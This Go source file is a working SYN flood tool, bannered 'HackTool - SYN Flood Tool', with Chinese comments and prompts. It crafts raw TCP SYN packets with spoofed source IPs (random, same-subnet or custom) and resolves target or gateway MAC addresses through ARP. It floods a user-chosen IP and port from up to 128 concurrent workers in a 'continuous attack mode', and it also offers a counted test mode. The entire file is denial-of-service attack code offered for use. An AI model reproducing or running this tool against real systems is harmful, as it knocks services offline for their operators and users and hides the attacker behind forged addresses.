package main

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// ifaceInfo 统一保存选中网卡的所有信息
type ifaceInfo struct {
	Name string           // 网卡/设备名
	IP   net.IP           // 网卡 IPv4
	MAC  net.HardwareAddr // 网卡 MAC
	Mask net.IPMask       // 子网掩码
}

// packetSender 平台特定的发包接口
type packetSender interface {
	Send(data []byte) error
	Close() error
}

// newPacketSender 平台特定实现，在各平台文件中定义
// func newPacketSender(deviceName string) (packetSender, error)

// sourceIPMode 源IP模式
type sourceIPMode int

const (
	srcModeRandom       sourceIPMode = iota // 1. 随机IP
	srcModeSubnetRandom                     // 2. 本网段随机IP
	srcModeCustom                           // 3. 自定义IP
	srcModeLocal                            // 4. 本机IP
)

// selectSourceIPMode 交互式选择源IP模式
func selectSourceIPMode() (sourceIPMode, string) {
	fmt.Println("\n源IP模式:")
	fmt.Println("  1. 随机IP（每次发包使用随机源IP）")
	fmt.Println("  2. 本网段随机IP（与本机同子网的随机IP）")
	fmt.Println("  3. 自定义IP（手动指定源IP）")
	fmt.Println("  4. 本机IP（使用本机真实IP）")
	fmt.Print("请选择源IP模式 [1-4] (默认 1): ")

	var input string
	fmt.Scanln(&input)
	input = strings.TrimSpace(input)
	if input == "" {
		return srcModeRandom, ""
	}

	switch input {
	case "1":
		return srcModeRandom, ""
	case "2":
		return srcModeSubnetRandom, ""
	case "3":
		fmt.Print("请输入自定义源IP: ")
		var customIP string
		fmt.Scanln(&customIP)
		customIP = strings.TrimSpace(customIP)
		if net.ParseIP(customIP) == nil {
			fmt.Println("[警告] 无效的IP地址，回退到随机IP模式")
			return srcModeRandom, ""
		}
		return srcModeCustom, customIP
	case "4":
		return srcModeLocal, ""
	default:
		fmt.Println("[警告] 无效选择，回退到随机IP模式")
		return srcModeRandom, ""
	}
}

// generateSubnetRandomIP 在指定子网内生成随机IP
// networkIP 和 mask 定义子网范围
func generateSubnetRandomIP(rng *rand.Rand, networkIP net.IP, mask net.IPMask) string {
	network := networkIP.Mask(mask)
	// 计算可用主机数
	ones, bits := mask.Size()
	hostBits := bits - ones
	if hostBits <= 0 {
		return network.String()
	}
	// 随机生成主机部分
	maxHost := (1 << uint(hostBits)) - 2 // 排除网络地址和广播地址
	if maxHost <= 0 {
		maxHost = 1
	}
	hostNum := rng.Intn(maxHost) + 1 // 1 ~ maxHost

	ip := make(net.IP, 4)
	copy(ip, network.To4())
	// 将 hostNum 写入主机位
	hostBytes := make([]byte, 4)
	hostBytes[0] = byte(hostNum >> 24)
	hostBytes[1] = byte(hostNum >> 16)
	hostBytes[2] = byte(hostNum >> 8)
	hostBytes[3] = byte(hostNum)
	for i := 0; i < 4; i++ {
		ip[i] |= hostBytes[i] & ^mask[i]
	}
	return ip.String()
}

// sourceIPGenerator 封装源IP生成逻辑，避免 worker 中重复分支
type sourceIPGenerator struct {
	mode      sourceIPMode
	customIP  string
	localIP   string
	networkIP net.IP
	mask      net.IPMask
}

func newSourceIPGenerator(mode sourceIPMode, customIP string, iface *ifaceInfo) *sourceIPGenerator {
	g := &sourceIPGenerator{
		mode:     mode,
		customIP: customIP,
	}
	if iface != nil {
		g.localIP = iface.IP.String()
		g.networkIP = iface.IP
		g.mask = iface.Mask
	}
	return g
}

func (g *sourceIPGenerator) next(rng *rand.Rand) string {
	switch g.mode {
	case srcModeRandom:
		return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
	case srcModeSubnetRandom:
		if g.networkIP != nil && g.mask != nil {
			return generateSubnetRandomIP(rng, g.networkIP, g.mask)
		}
		// fallback to full random
		return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
	case srcModeCustom:
		return g.customIP
	case srcModeLocal:
		if g.localIP != "" {
			return g.localIP
		}
		return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
	default:
		return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
	}
}

// selectInterface 根据目标 IP 选择最合适的网卡（纯 Go，不依赖 pcap）
func selectInterface(targetIP net.IP) (*ifaceInfo, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}

	var fallback *ifaceInfo

	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 || len(iface.HardwareAddr) == 0 {
			continue
		}

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			ipNet, ok := addr.(*net.IPNet)
			if !ok || ipNet.IP.IsLoopback() || ipNet.IP.To4() == nil {
				continue
			}

			ip := ipNet.IP.To4()
			info := &ifaceInfo{
				Name: iface.Name,
				IP:   ip,
				MAC:  iface.HardwareAddr,
				Mask: ipNet.Mask,
			}

			// 与目标同子网 → 优先选择
			if ip.Mask(ipNet.Mask).Equal(targetIP.Mask(ipNet.Mask)) {
				return info, nil
			}

			if fallback == nil {
				fallback = info
			}
		}
	}

	if fallback != nil {
		return fallback, nil
	}
	return nil, fmt.Errorf("no suitable network interface found")
}

// listAvailableInterfaces 列出所有可用的网络接口
func listAvailableInterfaces() ([]*ifaceInfo, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}

	var result []*ifaceInfo
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 || len(iface.HardwareAddr) == 0 {
			continue
		}

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			ipNet, ok := addr.(*net.IPNet)
			if !ok || ipNet.IP.IsLoopback() || ipNet.IP.To4() == nil {
				continue
			}

			result = append(result, &ifaceInfo{
				Name: iface.Name,
				IP:   ipNet.IP.To4(),
				MAC:  iface.HardwareAddr,
				Mask: ipNet.Mask,
			})
		}
	}
	return result, nil
}

// selectInterfaceInteractive 交互式选择网卡，返回 nil 表示使用自动选择
func selectInterfaceInteractive() *ifaceInfo {
	ifaces, err := listAvailableInterfaces()
	if err != nil || len(ifaces) == 0 {
		fmt.Println("[警告] 无法列出可用网卡，将使用自动选择")
		return nil
	}

	fmt.Println("\n可用网卡列表:")
	fmt.Println("--------------------------------------------------------------")
	fmt.Printf("  %-4s %-24s %-16s %s\n", "序号", "网卡名", "IPv4", "MAC")
	fmt.Println("--------------------------------------------------------------")
	for i, iface := range ifaces {
		fmt.Printf("  %-4d %-24s %-16s %s\n", i+1, iface.Name, iface.IP, iface.MAC)
	}
	fmt.Println("--------------------------------------------------------------")
	fmt.Print("请选择网卡序号 (直接回车使用自动选择): ")

	var input string
	fmt.Scanln(&input)
	input = strings.TrimSpace(input)
	if input == "" {
		return nil
	}

	var idx int
	if _, err := fmt.Sscanf(input, "%d", &idx); err != nil || idx < 1 || idx > len(ifaces) {
		fmt.Println("[警告] 无效选择，将使用自动选择")
		return nil
	}

	selected := ifaces[idx-1]
	fmt.Printf("[信息] 已选择网卡: %s (%s)\n", selected.Name, selected.IP)
	return selected
}

// getDefaultGateway 获取默认网关 IP
func getDefaultGateway() (string, error) {
	if runtime.GOOS == "windows" {
		out, err := exec.Command("cmd", "/c", "netstat", "-rn").Output()
		if err != nil {
			return "", err
		}
		for _, line := range strings.Split(string(out), "\n") {
			fields := strings.Fields(line)
			if len(fields) >= 3 && fields[0] == "0.0.0.0" && fields[1] == "0.0.0.0" {
				return fields[2], nil
			}
		}
	} else {
		out, err := exec.Command("ip", "route").Output()
		if err != nil {
			return "", err
		}
		for _, line := range strings.Split(string(out), "\n") {
			if strings.HasPrefix(line, "default") {
				fields := strings.Fields(line)
				for i, f := range fields {
					if f == "via" && i+1 < len(fields) {
						return fields[i+1], nil
					}
				}
			}
		}
	}
	return "", fmt.Errorf("default gateway not found")
}

// resolveMACByARP 通过系统 ARP 表解析 IP 对应的 MAC 地址
func resolveMACByARP(ip string) (net.HardwareAddr, error) {
	pingArgs := []string{"-n", "1", "-w", "1000", ip}
	if runtime.GOOS != "windows" {
		pingArgs = []string{"-c", "1", "-W", "1", ip}
	}
	exec.Command("ping", pingArgs...).Run()
	time.Sleep(500 * time.Millisecond)

	var out []byte
	var err error
	if runtime.GOOS == "windows" {
		out, err = exec.Command("arp", "-a", ip).Output()
	} else {
		out, err = exec.Command("arp", "-n", ip).Output()
	}
	if err != nil {
		return nil, err
	}

	re := regexp.MustCompile(`([0-9a-fA-F]{2}[-:]){5}[0-9a-fA-F]{2}`)
	match := re.FindString(string(out))
	if match == "" {
		return nil, fmt.Errorf("MAC not found in ARP table for %s", ip)
	}

	match = strings.ReplaceAll(match, "-", ":")
	return net.ParseMAC(match)
}

func sendSynPackets(targetIP string, targetPort uint16, workerCount int, userIface *ifaceInfo, srcMode sourceIPMode, customIP string) {
	parsedTargetIP := net.ParseIP(targetIP)

	// ===== 统一选择网卡 =====
	var iface *ifaceInfo
	var err error
	if userIface != nil {
		iface = userIface
		fmt.Printf("[信息] 使用指定网卡: %s\n", iface.Name)
	} else {
		iface, err = selectInterface(parsedTargetIP)
		if err != nil {
			log.Fatal("Failed to select interface: ", err)
		}
	}
	fmt.Printf("[信息] 网卡:   %s\n", iface.Name)
	fmt.Printf("[信息] 本机 IP:  %s\n", iface.IP)
	fmt.Printf("[信息] 本机 MAC: %s\n", iface.MAC)
	fmt.Printf("[信息] 子网掩码: %s\n", iface.Mask)

	// ===== 初始化源IP生成器 =====
	var srcModeName string
	switch srcMode {
	case srcModeRandom:
		srcModeName = "随机IP"
	case srcModeSubnetRandom:
		srcModeName = "本网段随机IP"
	case srcModeCustom:
		srcModeName = fmt.Sprintf("自定义IP (%s)", customIP)
	case srcModeLocal:
		srcModeName = fmt.Sprintf("本机IP (%s)", iface.IP)
	}
	fmt.Printf("[信息] 源IP模式: %s\n", srcModeName)
	srcGen := newSourceIPGenerator(srcMode, customIP, iface)

	// ===== 确定目的 MAC =====
	var dstMAC net.HardwareAddr
	if iface.Mask != nil && iface.IP.Mask(iface.Mask).Equal(parsedTargetIP.Mask(iface.Mask)) {
		fmt.Printf("[信息] 目标 %s 在同一子网，ARP 解析目标 MAC...\n", targetIP)
		dstMAC, err = resolveMACByARP(targetIP)
		if err != nil {
			log.Fatal("Failed to resolve target MAC: ", err)
		}
	} else {
		gateway, gwErr := getDefaultGateway()
		if gwErr != nil {
			log.Fatal("Failed to get default gateway: ", gwErr)
		}
		fmt.Printf("[信息] 目标 %s 不在同一子网，通过网关 %s 转发...\n", targetIP, gateway)
		dstMAC, err = resolveMACByARP(gateway)
		if err != nil {
			log.Fatal("Failed to resolve gateway MAC: ", err)
		}
	}
	fmt.Printf("[信息] 目的 MAC: %s\n", dstMAC)

	// ===== 初始化发包器（每个 worker 一个独立 handle）=====
	senders := make([]packetSender, workerCount)
	for i := 0; i < workerCount; i++ {
		ps, psErr := newPacketSender(iface.Name)
		if psErr != nil {
			log.Fatalf("Failed to init packet sender #%d: %v", i, psErr)
		}
		senders[i] = ps
	}
	defer func() {
		for _, ps := range senders {
			ps.Close()
		}
	}()

	// ===== 监听 Ctrl+C =====
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	var sentCount uint64
	var errCount uint64
	stopFlag := int32(0)

	// ===== 实时统计 goroutine =====
	go func() {
		var lastCount uint64
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			if atomic.LoadInt32(&stopFlag) != 0 {
				return
			}
			cur := atomic.LoadUint64(&sentCount)
			pps := cur - lastCount
			// 每包 54 字节（14 Eth + 20 IP + 20 TCP）
			bandwidth := float64(pps*54) / 1024.0 / 1024.0 * 8 // Mbps
			fmt.Printf("\r[统计] 总计: %d 包 | 速率: %d pps | 带宽: %.3f Mbps | 错误: %d    ",
				cur, pps, bandwidth, atomic.LoadUint64(&errCount))
			lastCount = cur
		}
	}()

	fmt.Printf("\n启动 %d 个并发 worker，无延迟发包，按 Ctrl+C 停止...\n\n", workerCount)

	// ===== 启动 worker goroutines =====
	var wg sync.WaitGroup
	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			// 每个 goroutine 独立随机源，避免锁竞争
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
			buf := gopacket.NewSerializeBuffer()
			options := gopacket.SerializeOptions{
				FixLengths:       true,
				ComputeChecksums: true,
			}
			ps := senders[workerID]

			for atomic.LoadInt32(&stopFlag) == 0 {
				srcIP := srcGen.next(rng)
				srcPort := uint16(rng.Intn(65535))

				ethLayer := layers.Ethernet{
					SrcMAC:       iface.MAC,
					DstMAC:       dstMAC,
					EthernetType: layers.EthernetTypeIPv4,
				}
				ipLayer := layers.IPv4{
					Version:  4,
					IHL:      5,
					TTL:      64,
					Protocol: layers.IPProtocolTCP,
					SrcIP:    net.ParseIP(srcIP),
					DstIP:    parsedTargetIP,
				}
				tcpLayer := layers.TCP{
					SrcPort:    layers.TCPPort(srcPort),
					DstPort:    layers.TCPPort(targetPort),
					Seq:        rng.Uint32(),
					DataOffset: 5,
					Window:     5840,
					SYN:        true,
				}
				tcpLayer.SetNetworkLayerForChecksum(&ipLayer)

				buf.Clear()
				if serErr := gopacket.SerializeLayers(buf, options, &ethLayer, &ipLayer, &tcpLayer); serErr != nil {
					atomic.AddUint64(&errCount, 1)
					continue
				}

				if sendErr := ps.Send(buf.Bytes()); sendErr != nil {
					atomic.AddUint64(&errCount, 1)
					continue
				}
				atomic.AddUint64(&sentCount, 1)
			}
		}(i)
	}

	// 等待停止信号
	<-sigChan
	atomic.StoreInt32(&stopFlag, 1)
	wg.Wait()

	total := atomic.LoadUint64(&sentCount)
	totalErr := atomic.LoadUint64(&errCount)
	fmt.Printf("\n\n已停止，共发送 %d 个 SYN 包，错误 %d 次\n", total, totalErr)
}

// testConfig 保存发包测试模式的配置，便于循环复用与修改
type testConfig struct {
	targetIP    string
	targetPort  uint16
	packetCount int
	iface       *ifaceInfo
	srcMode     sourceIPMode
	customIP    string
}

// readLine 打印提示并读取一行输入（去除首尾空白）
func readLine(prompt string) string {
	if prompt != "" {
		fmt.Print(prompt)
	}
	var s string
	fmt.Scanln(&s)
	return strings.TrimSpace(s)
}

// readIntDefault 读取整数，空输入或非法输入时返回默认值
func readIntDefault(prompt string, def int) int {
	s := readLine(prompt)
	if s == "" {
		return def
	}
	var v int
	if _, err := fmt.Sscanf(s, "%d", &v); err != nil {
		fmt.Println("[警告] 无效数字，保持原值")
		return def
	}
	return v
}

// editInteractive 交互式修改配置，直接回车保持原值
func (c *testConfig) editInteractive() {
	fmt.Println("\n===== 修改发包配置 (直接回车保持原值) =====")

	if s := readLine(fmt.Sprintf("目标 IP [%s]: ", c.targetIP)); s != "" {
		if net.ParseIP(s) != nil {
			c.targetIP = s
		} else {
			fmt.Println("[警告] 无效 IP，保持原值")
		}
	}

	p := readIntDefault(fmt.Sprintf("目标端口 [%d]: ", c.targetPort), int(c.targetPort))
	if p > 0 && p <= 65535 {
		c.targetPort = uint16(p)
	} else {
		fmt.Println("[警告] 端口范围应为 1-65535，保持原值")
	}

	n := readIntDefault(fmt.Sprintf("发包数量 [%d]: ", c.packetCount), c.packetCount)
	if n > 0 {
		c.packetCount = n
	} else {
		fmt.Println("[警告] 数量必须大于 0，保持原值")
	}

	if strings.EqualFold(readLine("是否重新选择网卡/源IP模式? (y/N): "), "y") {
		if iface := selectInterfaceInteractive(); iface != nil {
			c.iface = iface
		}
		c.srcMode, c.customIP = selectSourceIPMode()
	}
}

// sendPacketTest 发包测试模式：发送指定数量的 SYN 包，并输出统计结果
func sendPacketTest(targetIP string, targetPort uint16, packetCount int, userIface *ifaceInfo, srcMode sourceIPMode, customIP string) {
	parsedTargetIP := net.ParseIP(targetIP)

	// ===== 统一选择网卡 =====
	var iface *ifaceInfo
	var err error
	if userIface != nil {
		iface = userIface
		fmt.Printf("[信息] 使用指定网卡: %s\n", iface.Name)
	} else {
		iface, err = selectInterface(parsedTargetIP)
		if err != nil {
			log.Fatal("Failed to select interface: ", err)
		}
	}
	fmt.Printf("[信息] 网卡:   %s\n", iface.Name)
	fmt.Printf("[信息] 本机 IP:  %s\n", iface.IP)
	fmt.Printf("[信息] 本机 MAC: %s\n", iface.MAC)
	fmt.Printf("[信息] 子网掩码: %s\n", iface.Mask)

	// ===== 初始化源IP生成器 =====
	srcGen := newSourceIPGenerator(srcMode, customIP, iface)

	// ===== 确定目的 MAC =====
	var dstMAC net.HardwareAddr
	if iface.Mask != nil && iface.IP.Mask(iface.Mask).Equal(parsedTargetIP.Mask(iface.Mask)) {
		fmt.Printf("[信息] 目标 %s 在同一子网，ARP 解析目标 MAC...\n", targetIP)
		dstMAC, err = resolveMACByARP(targetIP)
		if err != nil {
			log.Fatal("Failed to resolve target MAC: ", err)
		}
	} else {
		gateway, gwErr := getDefaultGateway()
		if gwErr != nil {
			log.Fatal("Failed to get default gateway: ", gwErr)
		}
		fmt.Printf("[信息] 目标 %s 不在同一子网，通过网关 %s 转发...\n", targetIP, gateway)
		dstMAC, err = resolveMACByARP(gateway)
		if err != nil {
			log.Fatal("Failed to resolve gateway MAC: ", err)
		}
	}
	fmt.Printf("[信息] 目的 MAC: %s\n", dstMAC)

	// ===== 初始化发包器 =====
	sender, psErr := newPacketSender(iface.Name)
	if psErr != nil {
		log.Fatalf("Failed to init packet sender: %v", psErr)
	}
	defer sender.Close()

	// ===== 监听 Ctrl+C，允许提前中断 =====
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	defer signal.Stop(sigChan)
	stopFlag := int32(0)
	done := make(chan struct{})
	defer close(done)
	go func() {
		select {
		case <-sigChan:
			atomic.StoreInt32(&stopFlag, 1)
		case <-done:
		}
	}()

	var sentCount uint64
	var errCount uint64
	startTime := time.Now()

	fmt.Printf("\n开始发送 %d 个 SYN 包，按 Ctrl+C 可提前停止...\n\n", packetCount)

	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	buf := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	for i := 0; i < packetCount; i++ {
		if atomic.LoadInt32(&stopFlag) != 0 {
			break
		}

		srcIP := srcGen.next(rng)
		srcPort := uint16(rng.Intn(65535))

		ethLayer := layers.Ethernet{
			SrcMAC:       iface.MAC,
			DstMAC:       dstMAC,
			EthernetType: layers.EthernetTypeIPv4,
		}
		ipLayer := layers.IPv4{
			Version:  4,
			IHL:      5,
			TTL:      64,
			Protocol: layers.IPProtocolTCP,
			SrcIP:    net.ParseIP(srcIP),
			DstIP:    parsedTargetIP,
		}
		tcpLayer := layers.TCP{
			SrcPort:    layers.TCPPort(srcPort),
			DstPort:    layers.TCPPort(targetPort),
			Seq:        rng.Uint32(),
			DataOffset: 5,
			Window:     5840,
			SYN:        true,
		}
		tcpLayer.SetNetworkLayerForChecksum(&ipLayer)

		buf.Clear()
		if serErr := gopacket.SerializeLayers(buf, options, &ethLayer, &ipLayer, &tcpLayer); serErr != nil {
			atomic.AddUint64(&errCount, 1)
			continue
		}

		if sendErr := sender.Send(buf.Bytes()); sendErr != nil {
			atomic.AddUint64(&errCount, 1)
			continue
		}
		atomic.AddUint64(&sentCount, 1)

		// 每 100 个包或最后一个包刷新一次进度
		if (i+1)%100 == 0 || i == packetCount-1 {
			elapsed := time.Since(startTime)
			pps := float64(i+1) / elapsed.Seconds()
			fmt.Printf("\r[进度] %d/%d | 速率: %.1f pps | 错误: %d    ",
				i+1, packetCount, pps, atomic.LoadUint64(&errCount))
		}
	}

	total := atomic.LoadUint64(&sentCount)
	totalErr := atomic.LoadUint64(&errCount)
	elapsed := time.Since(startTime)
	var pps, bandwidth float64
	if elapsed.Seconds() > 0 {
		pps = float64(total) / elapsed.Seconds()
		bandwidth = float64(total*54) / 1024.0 / 1024.0 * 8 / elapsed.Seconds()
	}

	fmt.Printf("\n\n========== 发包测试结果 ==========\n")
	fmt.Printf("成功发送: %d\n", total)
	fmt.Printf("失败次数: %d\n", totalErr)
	fmt.Printf("耗时:     %.2f 秒\n", elapsed.Seconds())
	fmt.Printf("平均速率: %.1f pps\n", pps)
	fmt.Printf("平均带宽: %.3f Mbps\n", bandwidth)
	fmt.Println("===================================")
}

func main() {
	var targetIP string
	var targetPort int
	var workerCount int
	var packetCount int

	fmt.Println("========================================")
	fmt.Println("       HackTool - SYN Flood Tool")
	fmt.Println("========================================")
	fmt.Println("请选择模式:")
	fmt.Println("  1. 持续攻击模式 (无限发包，Ctrl+C 停止)")
	fmt.Println("  2. 发包测试模式 (发送指定数量的包)")
	fmt.Print("请选择模式 [1-2] (默认 1): ")

	var modeInput string
	fmt.Scanln(&modeInput)
	modeInput = strings.TrimSpace(modeInput)
	testMode := modeInput == "2"

	fmt.Print("请输入目标 IP: ")
	fmt.Scanln(&targetIP)
	if targetIP == "" {
		log.Fatal("目标 IP 不能为空")
	}
	if net.ParseIP(targetIP) == nil {
		log.Fatal("无效的目标 IP 地址")
	}

	fmt.Print("请输入目标端口: ")
	fmt.Scanln(&targetPort)
	if targetPort <= 0 || targetPort > 65535 {
		log.Fatal("端口范围: 1-65535")
	}

	if testMode {
		fmt.Print("请输入要发送的包数量: ")
		fmt.Scanln(&packetCount)
		if packetCount <= 0 {
			log.Fatal("包数量必须大于 0")
		}
	} else {
		fmt.Print("请输入并发 worker 数量 (建议 1-32): ")
		fmt.Scanln(&workerCount)
		if workerCount <= 0 {
			workerCount = 1
		}
		if workerCount > 128 {
			fmt.Println("[警告] worker 数量过大，已限制为 128")
			workerCount = 128
		}
	}

	// 交互式选择网卡
	selectedIface := selectInterfaceInteractive()

	// 交互式选择源IP模式
	srcMode, customIP := selectSourceIPMode()

	if testMode {
		cfg := &testConfig{
			targetIP:    targetIP,
			targetPort:  uint16(targetPort),
			packetCount: packetCount,
			iface:       selectedIface,
			srcMode:     srcMode,
			customIP:    customIP,
		}
		for {
			sendPacketTest(cfg.targetIP, cfg.targetPort, cfg.packetCount, cfg.iface, cfg.srcMode, cfg.customIP)

			fmt.Println("\n===== 测试完成，请选择下一步 =====")
			fmt.Println("  1. 再次发包 (使用相同配置)")
			fmt.Println("  2. 修改配置后发包")
			fmt.Println("  3. 退出")
			switch readLine("请选择 [1-3]: ") {
			case "2":
				cfg.editInteractive()
			case "3":
				fmt.Println("已退出。")
				return
			default:
				// "1" 或其他输入：使用相同配置再次发包
			}
		}
	} else {
		sendSynPackets(targetIP, uint16(targetPort), workerCount, selectedIface, srcMode, customIP)
	}
}
